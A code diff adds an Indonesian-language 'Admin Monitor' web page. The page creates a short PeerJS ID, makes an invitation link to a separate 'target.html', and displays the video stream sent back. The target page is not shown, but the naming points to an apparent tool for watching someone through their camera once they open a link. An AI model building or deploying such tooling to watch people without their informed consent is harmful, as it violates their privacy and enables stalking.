@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Monitor</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body { background: #111; color: #eee; font-family: monospace; text-align: center; padding: 20px; }
+        h1 { color: #00e5ff; margin-bottom: 10px; }
+        
+        .container { max-width: 500px; margin: 0 auto; }
+        
+        .box { background: #1a1a1a; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #333; }
+        
+        #short-id { 
+            color: #ffd700; 
+            font-size: 2.5rem; 
+            font-weight: bold; 
+            letter-spacing: 2px;
+            display: block;
+            margin: 10px 0;
+        }
+
+        #generated-link {
+            background: #000;
+            color: #0f0;
+            padding: 10px;
+            border: 1px dashed #444;
+            font-size: 0.9rem;
+            word-break: break-all;
+            margin-bottom: 15px;
+            min-height: 40px;
+        }
+
+        /* Tombol Utama (Generate) */
+        button.main-btn { 
+            width: 100%; padding: 15px; background: #e1b12c; border: none; 
+            font-size: 1.1rem; font-weight: bold; cursor: pointer; border-radius: 5px; color: #000;
+            margin-bottom: 10px;
+        }
+        button.main-btn:hover { background: #f1c43d; }
+
+        /* Tombol Kecil (Copy) */
+        button.copy-btn { 
+            padding: 10px 20px; background: #333; color: #fff; border: 1px solid #555; 
+            cursor: pointer; border-radius: 4px; display: none; /* Hidden by default */
+        }
+
+        #my-video { width: 100%; background: #000; border: 2px solid #00e5ff; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>📡 ADMIN MONITOR</h1>
+
+        <div class="box">
+            <div id="placeholder">Klik tombol di bawah untuk membuat Kode</div>
+            <span id="short-id" style="display:none;"></span>
+        </div>
+
+        <div class="box" id="link-box" style="opacity: 0.5; pointer-events: none;">
+            <strong>LINK UNDANGAN:</strong>
+            <div id="generated-link">...</div>
+            <button class="copy-btn" id="btn-copy" onclick="copyLink()">📋 COPY LINK</button>
+        </div>
+
+        <!-- TOMBOL GENERATE -->
+        <button class="main-btn" id="btn-gen" onclick="generateNewId()">🔄 GENERATE ID BARU</button>
+
+        <div id="video-container" style="display:none;">
+            <h2>📹 LIVE STREAM</h2>
+            <video id="my-video" autoplay playsinline></video>
+        </div>
+    </div>
+
+    <script>
+        let shortId = "";
+        let peer = null;
+        let myVideo = document.getElementById('my-video');
+
+        function generateShortId() {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+            let result = '';
+            for (let i = 0; i < 4; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        function generateTargetLink(id) {
+            const currentUrl = window.location.href;
+            const targetUrl = currentUrl.replace('admin.html', 'target.html');
+            return `${targetUrl}?id=${id}`;
+        }
+
+        function generateNewId() {
+            // 1. Buat ID Baru
+            shortId = generateShortId();
+            
+            // 2. Update UI
+            document.getElementById('placeholder').style.display = 'none';
+            document.getElementById('short-id').style.display = 'block';
+            document.getElementById('short-id').innerText = shortId;
+            
+            // Aktifkan box link
+            const linkBox = document.getElementById('link-box');
+            linkBox.style.opacity = '1';
+            linkBox.style.pointerEvents = 'auto';
+
+            const fullLink = generateTargetLink(shortId);
+            document.getElementById('generated-link').innerText = fullLink;
+            document.getElementById('btn-copy').style.display = 'inline-block';
+
+            // 3. Matikan Koneksi Peer Lama (Jika ada)
+            if (peer) {
+                peer.destroy();
+            }
+
+            // 4. Buat Koneksi Peer Baru dengan ID Baru
+            startPeerConnection();
+        }
+
+        function startPeerConnection() {
+            peer = new Peer(shortId, { debug: 0 });
+
+            peer.on('open', (id) => { 
+                console.log('New ID Active: ' + id); 
+            });
+
+            peer.on('call', (call) => {
+                call.answer(); 
+                call.on('stream', (userVideoStream) => {
+                    myVideo.srcObject = userVideoStream;
+                    document.getElementById('video-container').style.display = 'block';
+                });
+            });
+        }
+
+        function copyLink() {
+            const text = document.getElementById('generated-link').innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = document.getElementById('btn-copy');
+                btn.innerText = "✅ COPIED!";
+                setTimeout(() => { btn.innerText = "📋 COPY LINK"; }, 2000);
+            });
+        }
+    </script>
+</body>
+</html>
